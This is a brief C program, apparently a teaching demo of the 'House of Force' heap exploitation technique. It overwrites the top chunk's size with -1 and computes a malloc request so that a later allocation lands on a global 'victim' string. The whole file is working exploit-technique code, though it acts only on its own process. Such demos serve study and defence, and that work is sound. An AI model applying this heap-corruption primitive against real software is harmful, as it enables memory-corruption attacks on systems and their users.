#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

char victim[] = "This is victim's string that will returned by malloc";

struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[10];               // padding
};

int main() {
  struct chunk_structure *chunk, *top_chunk;
  unsigned long long *ptr;
  size_t requestSize, allotedSize;
  printf("%p\n", victim);
  ptr = malloc(256);
  chunk = (struct chunk_structure *)(ptr - 2);
  printf("%p\n", chunk);
  allotedSize = chunk->size & ~(0x1 | 0x2 | 0x4);
  top_chunk = (struct chunk_structure *)((char *)chunk + allotedSize);
  printf("%p\n", top_chunk);
  top_chunk->size = -1;      
  requestSize = (size_t)victim            
                  - (size_t)top_chunk     
                  - 2*sizeof(long long)  
                  - sizeof(long long);   

  printf("%p\n", malloc(requestSize));
  ptr = malloc(100);
  printf("%p\n", ptr);
  return 0;
}
